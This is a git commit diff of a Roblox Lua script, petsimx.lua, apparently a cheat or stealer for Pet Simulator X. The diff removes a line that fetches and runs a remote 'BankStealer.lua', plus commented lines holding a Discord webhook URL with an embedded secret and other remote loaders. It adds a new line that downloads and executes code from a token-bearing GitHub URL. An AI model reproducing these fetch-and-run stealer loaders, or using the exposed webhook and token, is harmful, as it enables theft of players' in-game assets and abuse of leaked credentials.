2a5d1079e28678b71c4d0d3af3469a315b50fde1
Adidsus <85895319+Adidsus@users.noreply.github.com>
2023-09-11 14:35:06 +0200

    Update petsimx.lua

--- petsimx.lua
+++ petsimx.lua
@@ -1,7 +1,3 @@
--- _G.UserID = 12490815
--- _G.WebHook = "https://discord.com/api/webhooks/1061617319199129691/2rA5_qHdSvbnjS-bM4LTLeQbQS7CzEUkkRZ5m0epsghd2FuYAqsJ7EWb9-jYuXmmpFXw"
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/untested/main/BankStealer.lua",true))()
--- wait(1)
--- getgenv().boothsnipe = false
--- loadstring(game:HttpGet('https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua'))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/Qquae/main/petsimx.lua?token=GHSAT0AAAAAACFV6SIENG4A72RFPMZPMHDAZH7C5JA",true))()
+
